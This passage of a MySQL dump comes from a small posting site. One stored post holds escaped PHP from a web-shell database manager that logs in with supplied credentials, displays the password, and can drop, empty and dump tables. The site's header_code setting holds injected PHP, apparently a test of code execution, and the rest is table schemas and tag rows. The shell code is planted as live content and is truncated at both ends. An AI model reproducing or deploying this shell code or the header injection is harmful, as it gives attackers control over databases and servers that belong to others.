mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}\\r\\n }\\r\\n else {$sql_sock = false;}\\r\\n echo &quot;&lt;b&gt;SQL Manager:&lt;\\/b&gt;&lt;br&gt;&quot;;\\r\\n if (!$sql_sock)\\r\\n {\\r\\n  if (!$sql_server) {echo &quot;NO CONNECTION&quot;;}\\r\\n  else {echo &quot;&lt;center&gt;&lt;b&gt;Can\'t connect&lt;\\/b&gt;&lt;\\/center&gt;&quot;; echo &quot;&lt;b&gt;&quot;.$err.&quot;&lt;\\/b&gt;&quot;;}\\r\\n }\\r\\n else\\r\\n {\\r\\n  $sqlquicklaunch = array();\\r\\n  $sqlquicklaunch[] = array(&quot;Index&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;&quot;);\\r\\n  $sqlquicklaunch[] = array(&quot;Query&quot;,$sql_surl.&quot;sql_act=query&amp;sql_tbl=&quot;.urlencode($sql_tbl));\\r\\n  $sqlquicklaunch[] = array(&quot;Server-status&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=serverstatus&quot;);\\r\\n  $sqlquicklaunch[] = array(&quot;Server variables&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=servervars&quot;);\\r\\n  $sqlquicklaunch[] = array(&quot;Processes&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=processes&quot;);\\r\\n  $sqlquicklaunch[] = array(&quot;Logout&quot;,$surl.&quot;act=sql&quot;);\\r\\n  echo &quot;&lt;center&gt;&lt;b&gt;MySQL &quot;.mysql_get_server_info().&quot; (proto v.&quot;.mysql_get_proto_info ().&quot;) running in &quot;.htmlspecialchars($sql_server).&quot;:&quot;.htmlspecialchars($sql_port).&quot; as &quot;.htmlspecialchars($sql_login).&quot;@&quot;.htmlspecialchars($sql_server).&quot; (password - \\\\&quot;&quot;.htmlspecialchars($sql_passwd).&quot;\\\\&quot;)&lt;\\/b&gt;&lt;br&gt;&quot;;\\r\\n  if (count($sqlquicklaunch) &gt; 0) {foreach($sqlquicklaunch as $item) {echo &quot;[ &lt;a href=\\\\&quot;&quot;.$item[1].&quot;\\\\&quot;&gt;&lt;b&gt;&quot;.$item[0].&quot;&lt;\\/b&gt;&lt;\\/a&gt; ] &quot;;}}\\r\\n  echo &quot;&lt;\\/center&gt;&quot;;\\r\\n }\\r\\n echo &quot;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;tr&gt;&quot;;\\r\\n if (!$sql_sock) {?&gt;&lt;td width=&quot;28%&quot; height=&quot;100&quot; valign=&quot;top&quot;&gt;&lt;center&gt;&lt;font size=&quot;5&quot;&gt; i &lt;\\/font&gt;&lt;\\/center&gt;&lt;li&gt;If login is null, login is owner of process.&lt;li&gt;If host is null, host is localhost&lt;\\/b&gt;&lt;li&gt;If port is null, port is 3306 (default)&lt;\\/td&gt;&lt;td width=&quot;90%&quot; height=&quot;1&quot; valign=&quot;top&quot;&gt;&lt;TABLE height=1 cellSpacing=0 cellPadding=0 width=&quot;100%&quot; border=0&gt;&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;b&gt;Please, fill the form:&lt;\\/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Username&lt;\\/b&gt;&lt;\\/td&gt;&lt;td&gt;&lt;b&gt;Password&lt;\\/b&gt;&amp;nbsp;&lt;\\/td&gt;&lt;td&gt;&lt;b&gt;Database&lt;\\/b&gt;&amp;nbsp;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;form&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sql_login&quot; value=&quot;root&quot; maxlength=&quot;64&quot;&gt;&lt;\\/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;sql_passwd&quot; value=&quot;&quot; maxlength=&quot;64&quot;&gt;&lt;\\/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sql_db&quot; value=&quot;&quot; maxlength=&quot;64&quot;&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Host&lt;\\/b&gt;&lt;\\/td&gt;&lt;td&gt;&lt;b&gt;PORT&lt;\\/b&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;tr&gt;&lt;td align=right&gt;&lt;input type=&quot;text&quot; name=&quot;sql_server&quot; value=&quot;localhost&quot; maxlength=&quot;64&quot;&gt;&lt;\\/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sql_port&quot; value=&quot;3306&quot; maxlength=&quot;6&quot; size=&quot;3&quot;&gt;&lt;\\/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;Connect&quot;&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;\\/form&gt;&lt;\\/table&gt;&lt;\\/td&gt;&lt;?php }\\r\\n else\\r\\n {\\r\\n  \\/\\/Start left panel\\r\\n  if (!empty($sql_db))\\r\\n  {\\r\\n   ?&gt;&lt;td width=&quot;25%&quot; height=&quot;100%&quot; valign=&quot;top&quot;&gt;&lt;a href=&quot;&lt;?php echo $surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;&quot;; ?&gt;&quot;&gt;&lt;b&gt;Home&lt;\\/b&gt;&lt;\\/a&gt;&lt;hr size=&quot;1&quot; noshade&gt;&lt;?php\\r\\n   $result = mysql_list_tables($sql_db);\\r\\n   if (!$result) {echo mysql_smarterror();}\\r\\n   else\\r\\n   {\\r\\n    echo &quot;---[ &lt;a href=\\\\&quot;&quot;.$sql_surl.&quot;&amp;\\\\&quot;&gt;&lt;b&gt;&quot;.htmlspecialchars($sql_db).&quot;&lt;\\/b&gt;&lt;\\/a&gt; ]---&lt;br&gt;&quot;;\\r\\n    $c = 0;\\r\\n    while ($row = mysql_fetch_array($result)) {$count = mysql_query (&quot;SELECT COUNT(*) FROM &quot;.$row[0]); $count_row = mysql_fetch_array($count); echo &quot;&lt;b&gt;&raquo;&amp;nbsp;&lt;a href=\\\\&quot;&quot;.$sql_surl.&quot;sql_db=&quot;.htmlspecialchars($sql_db).&quot;&amp;sql_tbl=&quot;.htmlspecialchars($row[0]).&quot;\\\\&quot;&gt;&lt;b&gt;&quot;.htmlspecialchars($row[0]).&quot;&lt;\\/b&gt;&lt;\\/a&gt; (&quot;.$count_row[0].&quot;)&lt;\\/br&gt;&lt;\\/b&gt;&quot;; mysql_free_result($count); $c++;}\\r\\n    if (!$c) {echo &quot;No tables found in database.&quot;;}\\r\\n   }\\r\\n  }\\r\\n  else\\r\\n  {\\r\\n   ?&gt;&lt;td width=&quot;1&quot; height=&quot;100&quot; valign=&quot;top&quot;&gt;&lt;a href=&quot;&lt;?php echo $sql_surl; ?&gt;&quot;&gt;&lt;b&gt;Home&lt;\\/b&gt;&lt;\\/a&gt;&lt;hr size=&quot;1&quot; noshade&gt;&lt;?php\\r\\n   $result = mysql_list_dbs($sql_sock);\\r\\n   if (!$result) {echo mysql_smarterror();}\\r\\n   else\\r\\n   {\\r\\n    ?&gt;&lt;form action=&quot;&lt;?php echo $surl; ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_login); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_server); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_port); ?&gt;&quot;&gt;&lt;select name=&quot;sql_db&quot;&gt;&lt;?php\\r\\n    $c = 0;\\r\\n    $dbs = &quot;&quot;;\\r\\n    while ($row = mysql_fetch_row($result)) {$dbs .= &quot;&lt;option value=\\\\&quot;&quot;.$row[0].&quot;\\\\&quot;&quot;; if ($sql_db == $row[0]) {$dbs .= &quot; selected&quot;;} $dbs .= &quot;&gt;&quot;.$row[0].&quot;&lt;\\/option&gt;&quot;; $c++;}\\r\\n    echo &quot;&lt;option value=\\\\&quot;\\\\&quot;&gt;Databases (&quot;.$c.&quot;)&lt;\\/option&gt;&quot;;\\r\\n    echo $dbs;\\r\\n   }\\r\\n   ?&gt;&lt;\\/select&gt;&lt;hr size=&quot;1&quot; noshade&gt;Please, select database&lt;hr size=&quot;1&quot; noshade&gt;&lt;input type=&quot;submit&quot; value=&quot;Go&quot;&gt;&lt;\\/form&gt;&lt;?php\\r\\n  }\\r\\n  \\/\\/End left panel\\r\\n  echo &quot;&lt;\\/td&gt;&lt;td width=\\\\&quot;100%\\\\&quot; height=\\\\&quot;1\\\\&quot; valign=\\\\&quot;top\\\\&quot;&gt;&quot;;\\r\\n  \\/\\/Start center panel\\r\\n  $diplay = true;\\r\\n  if ($sql_db)\\r\\n  {\\r\\n   if (!is_numeric($c)) {$c = 0;}\\r\\n   if ($c == 0) {$c = &quot;no&quot;;}\\r\\n   echo &quot;&lt;hr size=\\\\&quot;1\\\\&quot; noshade&gt;&lt;center&gt;&lt;b&gt;There are &quot;.$c.&quot; table(s) in this DB (&quot;.htmlspecialchars($sql_db).&quot;).&lt;br&gt;&quot;;\\r\\n   if (count($dbquicklaunch) &gt; 0) {foreach($dbsqlquicklaunch as $item) {echo &quot;[ &lt;a href=\\\\&quot;&quot;.$item[1].&quot;\\\\&quot;&gt;&quot;.$item[0].&quot;&lt;\\/a&gt; ] &quot;;}}\\r\\n   echo &quot;&lt;\\/b&gt;&lt;\\/center&gt;&quot;;\\r\\n   $acts = array(&quot;&quot;,&quot;dump&quot;);\\r\\n   if ($sql_act == &quot;tbldrop&quot;) {$sql_query = &quot;DROP TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\\\\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,strlen($sql_query)-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}\\r\\n   elseif ($sql_act == &quot;tblempty&quot;) {$sql_query = &quot;&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;DELETE FROM `&quot;.$v.&quot;` \\\\n&quot;;} $sql_act = &quot;query&quot;;}\\r\\n   elseif ($sql_act == &quot;tbldump&quot;) {if (count($boxtbl) &gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = &quot;dump&quot;;}\\r\\n   elseif ($sql_act == &quot;tblcheck&quot;) {$sql_query = &quot;CHECK TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\\\\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,strlen($sql_query)-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}\\r\\n   elseif ($sql_act == &quot;tbloptimize&quot;) {$sql_query = &quot;OPTIMIZE TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\\\\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,strlen($sql_query)-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}\\r\\n   elseif ($sql_act == &quot;tblrepair&quot;) {$sql_query = &quot;REPAIR TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\\\\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,strlen($sql_query)-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}\\r\\n   elseif ($sql_act == &quot;tblanalyze&quot;) {$sql_query = &quot;ANALYZE TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\\\\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,strlen($sql_query)-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}\\r\\n   elseif ($sql_act == &quot;deleterow&quot;) {$sql_query = &quot;&quot;; if (!empty($boxrow_all)) {$sql_query = &quot;DELETE * FROM `&quot;.$sql_tbl.&quot;`;&quot;;} else {foreach($boxrow as $v) {$sql_query .= &quot;DELETE * FROM `&quot;.$sql_tbl.&quot;` WHERE&quot;.$v.&quot; LIMIT 1;\\\\n&quot;;} $sql_query = substr($sql_query,0,strlen($sql_query)-1);} $sql_act = &quot;query&quot;;}\\r\\n   elseif ($sql_tbl_act == &quot;insert&quot;)\\r\\n   {\\r\\n    if ($sql_tbl_insert_radio == 1)\\r\\n    {\\r\\n     $keys = &quot;&quot;;\\r\\n     $akeys = array_keys($sql_tbl_insert);\\r\\n     foreach ($akeys as $v) {$keys .= &quot;`&quot;.addslashes($v).&quot;`, &quot;;}\\r\\n     if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}\\r\\n     $values = &quot;&quot;;\\r\\n     $i = 0;\\r\\n     foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct.&quot; (&quot;;} $values .= &quot;\'&quot;.addslashes($v).&quot;\'&quot;; if ($funct) {$values .= &quot;)&quot;;} $values .= &quot;, &quot;; $i++;}\\r\\n     if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}\\r\\n     $sql_query = &quot;INSERT INTO `&quot;.$sql_tbl.&quot;` ( &quot;.$keys.&quot; ) VALUES ( &quot;.$values.&quot; );&quot;;\\r\\n     $sql_act = &quot;query&quot;;\\r\\n     $sql_tbl_act = &quot;browse&quot;;\\r\\n    }\\r\\n    elseif ($sql_tbl_insert_radio == 2)\\r\\n    {\\r\\n     $set = mysql_buildwhere($sql_tbl_insert,&quot;, &quot;,$sql_tbl_insert_functs);\\r\\n     $sql_query = &quot;UPDATE `&quot;.$sql_tbl.&quot;` SET &quot;.$set.&quot; WHERE &quot;.$sql_tbl_insert_q.&quot; LIMIT 1;&quot;;\\r\\n     $result = mysql_query($sql_query) or print(mysql_smarterror());\\r\\n     $result = mysql_fetch_array($result, MYSQL_ASSOC);\\r\\n     $sql_act = &quot;query&quot;;\\r\\n     $sql_tbl_act = &quot;browse&quot;;\\r\\n    }\\r\\n   }\\r\\n   if ($sql_act == &quot;query&quot;)\\r\\n   {\\r\\n    echo &quot;&lt;hr size=\\\\&quot;1\\\\&quot; noshade&gt;&quot;;\\r\\n    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = &quot;Query was empty&quot;;} echo &quot;&lt;b&gt;Error:&lt;\\/b&gt; &lt;br&gt;&quot;.$sql_query_error.&quot;&lt;br&gt;&quot;;}\\r\\n    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}\\r\\n    if ((!$submit) or ($sql_act)) {echo &quot;&lt;table border=\\\\&quot;0\\\\&quot; width=\\\\&quot;100%\\\\&quot; height=\\\\&quot;1\\\\&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=\\\\&quot;&quot;.$sql_surl.&quot;\\\\&quot; method=\\\\&quot;POST\\\\&quot;&gt;&lt;b&gt;&quot;; if (($sql_query) and (!$submit)) {echo &quot;Do you really want to:&quot;;} else {echo &quot;SQL-Query :&quot;;} echo &quot;&lt;\\/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\\\\&quot;sql_query\\\\&quot; cols=\\\\&quot;100\\\\&quot; rows=\\\\&quot;10\\\\&quot;&gt;&quot;.htmlspecialchars($sql_query).&quot;&lt;\\/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;sql_act\\\\&quot; value=\\\\&quot;query\\\\&quot;&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;sql_tbl\\\\&quot; value=\\\\&quot;&quot;.htmlspecialchars($sql_tbl).&quot;\\\\&quot;&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;submit\\\\&quot; value=\\\\&quot;1\\\\&quot;&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;sql_goto\\\\&quot; value=\\\\&quot;&quot;.htmlspecialchars($sql_goto).&quot;\\\\&quot;&gt;&lt;input type=\\\\&quot;submit\\\\&quot; name=\\\\&quot;sql_confirm\\\\&quot; value=\\\\&quot;Yes\\\\&quot;&gt;&amp;nbsp;&lt;input type=\\\\&quot;submit\\\\&quot; value=\\\\&quot;No\\\\&quot;&gt;&lt;\\/form&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;\\/table&gt;&quot;;}\\r\\n   }\\r\\n   if (in_array($sql_act,$acts))\\r\\n   {\\r\\n    ?&gt;&lt;table border=&quot;0&quot; width=&quot;100%&quot; height=&quot;1&quot;&gt;&lt;tr&gt;&lt;td width=&quot;30%&quot; height=&quot;1&quot;&gt;&lt;b&gt;Create new table:&lt;\\/b&gt;&lt;form action=&quot;&lt;?php echo $surl; ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newtbl&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_db); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_login); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_server); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_port); ?&gt;&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;sql_newtbl&quot; size=&quot;20&quot;&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;Create&quot;&gt;&lt;\\/form&gt;&lt;\\/td&gt;&lt;td width=&quot;30%&quot; height=&quot;1&quot;&gt;&lt;b&gt;Dump DB:&lt;\\/b&gt;&lt;form action=&quot;&lt;?php echo $surl; ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;dump&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_db); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_login); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_server); ?&gt;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;&lt;?php echo htmlspecialchars($sql_port); ?&gt;&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;dump_file&quot; size=&quot;30&quot; value=&quot;&lt;?php echo &quot;dump_&quot;.$SERVER_NAME.&quot;_&quot;.$sql_db.&quot;_&quot;.date(&quot;d-m-Y-H-i-s&quot;).&quot;.sql&quot;; ?&gt;&quot;&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; name=\\\\&quot;submit\\\\&quot; value=&quot;Dump&quot;&gt;&lt;\\/form&gt;&lt;\\/td&gt;&lt;td width=&quot;30%&quot; height=&quot;1&quot;&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;tr&gt;&lt;td wi','2014-05-18 07:15:41','2014-05-18 07:15:41',NULL);
/*!40000 ALTER TABLE `regular_posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settings` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `option` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `value` text COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settings`
--

LOCK TABLES `settings` WRITE;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
INSERT INTO `settings` VALUES (1,'header_code','&lt;?php echo \'mert\'; ?&gt;','2014-05-15 03:07:52','2014-05-18 07:04:25'),(2,'footer_code','&lt;div style=&quot;margin:0 auto;font-size:10px;text-align:center;color:#666&quot;&gt;Powered by &lt;a style=&quot;color:#666;text-decoration:underline&quot; href=&quot;http://getdpd.com&quot; target=&quot;_blank&quot;&gt;DPD&lt;/a&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;window.NREUM||(NREUM={});NREUM.info={&quot;beacon&quot;:&quot;beacon-5.newrelic.com&quot;,&quot;licenseKey&quot;:&quot;59b1fc10e5&quot;,&quot;applicationID&quot;:&quot;1184526&quot;,&quot;transactionName&quot;:&quot;M1FbYEEHWUsEAkFcDgobeFdHD1hWSgJURxVLUFxYWhBSSg==&quot;,&quot;queueTime&quot;:0,&quot;applicationTime&quot;:53,&quot;ttGuid&quot;:&quot;&quot;,&quot;agentToken&quot;:&quot;&quot;,&quot;userAttributes&quot;:&quot;&quot;,&quot;errorBeacon&quot;:&quot;jserror.newrelic.com&quot;,&quot;agent&quot;:&quot;js-agent.newrelic.com\\/nr-353.min.js&quot;}&lt;/script&gt;&lt;/body&gt;\r\n&lt;/html&gt;','2014-05-15 03:07:52','2014-05-18 07:07:36');
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tags`
--

DROP TABLE IF EXISTS `tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tags` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=61 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tags`
--

LOCK TABLES `tags` WRITE;
/*!40000 ALTER TABLE `tags` DISABLE KEYS */;
INSERT INTO `tags` VALUES (1,'poem','2014-05-15 04:39:53','2014-05-15 04:39:53'),(2,'lines','2014-05-15 04:39:53','2014-05-15 04:39:53'),(3,'quotes','2014-05-15 04:39:53','2014-05-15 04:39:53'),(4,'sdfsf','2014-05-15 04:39:56','2014-05-15 04:39:56'),(5,'#hugs#kiss','2014-05-15 04:40:21','2014-05-15 04:40:21'),(6,'','2014-05-15 04:40:25','2014-05-15 04:40:25'),(7,'hello','2014-05-15 04:41:01','2014-05-15 04:41:01'),(8,'a','2014-05-15 04:42:11','2014-05-15 04:42:11'),(9,'b','2014-05-15 04:42:11','2014-05-15 04:42:11'),(10,'hellopoem','2014-05-15 04:42:18','2014-05-15 04:42:18'),(11,'tag','2014-05-15 04:42:43','2014-05-15 04:42:43'),(12,'asa','2014-05-15 04:42:43','2014-05-15 04:42:43'),(13,'kiss','2014-05-15 04:43:14','2014-05-15 04:43:14'),(14,'love','2014-05-15 04:43:14','2014-05-15 04:43:14'),(15,'hugs','2014-05-15 04:43:14','2014-05-15 04:43:14'),(16,'life','2014-05-15 04:44:32','2014-05-15 04:44:32'),(17,'world','2014-05-15 04:44:32','2014-05-15 04:44:32'),(18,'peace','2014-05-15 04:44:32','2014-05-15 04:44:32'),(19,'girlsnigeria','2014-05-15 04:45:44','2014-05-15 04:45:44'),(20,'girls','2014-05-15 04:46:26','2014-05-15 04:46:26'),(21,'nigeria','2014-05-15 04:46:26','2014-05-15 04:46:26'),(22,'#red#girls','2014-05-15 04:50:32','2014-05-15 04:50:32'),(23,'bikini','2014-05-15 04:51:09','2014-05-15 04:51:09'),(24,'undie','2014-05-15 04:51:26','2014-05-15 04:51:26'),(25,'bra','2014-05-15 04:51:45','2014-05-15 04:51:45'),(26,'sex','2014-05-15 04:52:08','2014-05-15 04:52:08'),(27,'shoes','2014-05-15 04:58:01','2014-05-15 04:58:01'),(28,'red','2014-05-15 04:58:01','2014-05-15 04:58:01'),(29,'nike','2014-05-15 04:58:01','2014-05-15 04:58:01'),(30,'adidas','2014-05-15 04:58:47','2014-05-15 04:58:47'),(31,'shoe','2014-05-15 04:58:47','2014-05-15 04:58:47'),(32,'running','2014-05-15 04:58:47','2014-05-15 04:58:47'),(33,'doitright','2014-05-15 04:58:59','2014-05-15 04:58:59'),(34,'sf','2014-05-15 05:10:29','2014-05-15 05:10:29'),(35,'f','2014-05-15 05:10:29','2014-05-15 05:10:29'),(36,'aa','2014-05-15 05:11:06','2014-05-15 05:11:06'),(37,'chat','2014-05-15 05:14:22','2014-05-15 05:14:22'),(38,'colors','2014-05-15 05:15:06','2014-05-15 05:15:06'),(39,'text','2014-05-15 05:15:29','2014-05-15 05:15:29'),(40,'dummy','2014-05-15 05:34:13','2014-05-15 05:34:13'),(41,'black','2014-05-15 06:09:19','2014-05-15 06:09:19'),(42,'fun','2014-05-15 06:09:43','2014-05-15 06:09:43'),(43,'wear','2014-05-15 06:10:39','2014-05-15 06:10:39'),(44,'#love','2014-05-15 06:11:27','2014-05-15 06:11:27'),(45,'obama','2014-05-15 06:42:57','2014-05-15 06:42:57'),(46,'priyanka','2014-05-15 06:50:59','2014-05-15 06:50:59'),(47,'bodypaintedjeans','2014-05-15 07:28:18','2014-05-15 07:28:18'),(48,'thongs','2014-05-15 07:28:18','2014-05-15 07:28:18'),(49,'beach','2014-05-16 03:24:45','2014-05-16 03:24:45'),(50,'good','2014-05-16 03:25:17','2014-05-16 03:25:17'),(51,'arts','2014-05-16 03:31:02','2014-05-16 03:31:02'),(52,'YellowPagesscript','2014-05-18 00:22:05','2014-05-18 00:22:05'),(53,'QSDQSDSQD','2014-05-18 02:07:31','2014-05-18 02:07:31'),(54,'qsdfQSDF','2014-05-18 02:09:28','2014-05-18 02:09:28'),(55,'edfzeFZE','2014-05-18 02:09:45','2014-05-18 02:09:45'),(56,'SQDFSD','2014-05-18 02:10:06','2014-05-18 02:10:06'),(57,'happy','2014-05-18 04:19:08','2014-05-18 04:19:08'),(58,'Chat-for-gay-guys','2014-05-18 06:37:33','2014-05-18 06:37:33'),(59,'Gays-sister-brother','2014-05-18 06:37:33','2014-05-18 06:37:33'),(60,'testgood','2014-05-18 07:13:52','2014-05-18 07:13:52');
/*!40000 ALTER TABLE `tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `throttle`
--

DROP TABLE IF EXISTS `throttle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `throttle` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `ip_address` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `attempts` int(11) NOT NULL DEFAULT '0',
  `suspended` tinyint(1) NOT NULL DEFAULT '0',
  `banned` tinyint(1) NOT NULL DEFAULT '0',
  `last_attempt_at` timestamp NULL DEFAULT NULL,
  `suspended_at` timestamp NULL DEFAULT NULL,
  `banned_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `throttle_user_id_index` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `throttle`
--

LOCK TABLES `throttle` WRITE;
